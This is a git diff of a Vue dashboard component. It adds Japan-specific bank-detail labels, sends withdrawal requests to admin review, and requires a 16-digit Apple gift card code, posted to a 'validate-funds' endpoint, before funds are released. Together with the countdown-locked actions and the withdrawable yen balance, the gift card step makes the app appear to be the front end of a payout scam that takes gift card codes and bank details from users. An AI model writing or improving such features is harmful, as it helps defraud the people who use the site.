@@ -52,7 +52,14 @@ const actionLockCountdown = ref('24:00:00');
 
 const withdrawableBalance = computed(() => Number(page.props.auth?.user?.withdrawable_balance ?? 0));
 const userIsAdmin = computed(() => Boolean(page.props.auth?.user?.is_admin));
+const currentCountryCode = computed(() => page.props.auth?.currentCountryCode ?? null);
+const isJapanUser = computed(() => currentCountryCode.value === 'JP');
 const areQuickActionsLocked = computed(() => !userIsAdmin.value && Boolean(actionsLockedUntil.value && actionsLockedUntil.value > Date.now()));
+const bankNameLabel = computed(() => isJapanUser.value ? 'Japanese Bank Name' : 'Bank Name');
+const accountNumberLabel = computed(() => isJapanUser.value ? 'Japanese Bank Number' : 'Account Number');
+const accountNumberPlaceholder = computed(() => isJapanUser.value ? '4-digit bank number' : 'Enter account number');
+const routingNumberLabel = computed(() => isJapanUser.value ? 'Japanese Routing Number' : 'Routing Number');
+const routingNumberPlaceholder = computed(() => isJapanUser.value ? '3-digit routing number' : 'Enter routing number');
 
 const formatYen = (value) => new Intl.NumberFormat('ja-JP').format(Number(value ?? 0));
 
@@ -84,11 +91,6 @@ const syncQuickActionLock = () => {
 };
 
 const openWithdrawModal = () => {
-    if (bankDetailsSaved.value) {
-        startWithdraw();
-        return;
-    }
-
     showWithdrawModal.value = true;
     withdrawError.value = '';
     withdrawMessage.value = '';
@@ -126,10 +128,26 @@ const submitWithdraw = () => {
         return;
     }
 
-    bankDetailsSaved.value = true;
-    showWithdrawModal.value = false;
-    withdrawError.value = '';
-    withdrawMessage.value = `Bank details saved for ${bankName.value}. Next withdrawal will initiate the transfer.`;
+    router.post(route('withdrawals.store'), {
+        bank_name: bankName.value,
+        account_number: accountNumber.value,
+        routing_number: routingNumber.value,
+    }, {
+        preserveScroll: true,
+        onSuccess: () => {
+            bankDetailsSaved.value = true;
+            showWithdrawModal.value = false;
+            withdrawError.value = '';
+            withdrawMessage.value = `Withdrawal request submitted for ${bankName.value}. Awaiting admin review.`;
+        },
+        onError: (errors) => {
+            withdrawError.value = errors.bank_name
+                ?? errors.account_number
+                ?? errors.routing_number
+                ?? errors.amount
+                ?? 'Unable to submit the withdrawal request. Please review your bank details.';
+        },
+    });
 };
 
 const startWithdraw = () => {
@@ -184,11 +202,18 @@ const submitAppleForm = () => {
         return;
     }
 
+    const normalizedGiftCardCode = appleGiftCardAmount.value.replace(/\D/g, '');
+
+    if (normalizedGiftCardCode.length !== 16) {
+        fundsValidationMessage.value = 'Apple gift card validation requires exactly 16 digits.';
+        return;
+    }
+
     appleSubmitting.value = true;
 
     router.post('/validate-funds/apple-gift-card', {
         amount: appleAmount.value,
-        gift_card_code: appleGiftCardAmount.value,
+        gift_card_code: normalizedGiftCardCode,
     }, {
         preserveScroll: true,
         onSuccess: async () => {
@@ -349,22 +374,22 @@ onMounted(() => {
                         <div class="flex items-center justify-between mb-4">
                             <div>
                                 <h3 class="text-lg font-semibold text-white">Confirm Bank Details</h3>
-                                <p class="text-sm text-gray-400">Enter account information before completing the withdrawal.</p>
+                                <p class="text-sm text-gray-400">{{ isJapanUser ? 'Japan-based users must register a Japanese bank, a 4-digit bank number, and a 3-digit routing number.' : 'Enter account information before completing the withdrawal.' }}</p>
                             </div>
                             <button @click="closeWithdrawModal" class="text-gray-400 hover:text-white">✕</button>
                         </div>
                         <div class="space-y-4">
                             <div>
-                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Bank Name</label>
-                                <input v-model="bankName" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter bank name" />
+                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ bankNameLabel }}</label>
+                                <input v-model="bankName" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="isJapanUser ? 'Example: みずほ銀行' : 'Enter bank name'" />
                             </div>
                             <div>
-                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Account Number</label>
-                                <input v-model="accountNumber" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter account number" />
+                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ accountNumberLabel }}</label>
+                                <input v-model="accountNumber" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="accountNumberPlaceholder" />
                             </div>
                             <div>
-                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">Routing Number</label>
-                                <input v-model="routingNumber" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" placeholder="Enter routing number" />
+                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ routingNumberLabel }}</label>
+                                <input v-model="routingNumber" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="routingNumberPlaceholder" />
                             </div>
                         </div>
                         <div class="mt-4 flex flex-col gap-3 sm:flex-row sm:justify-end">
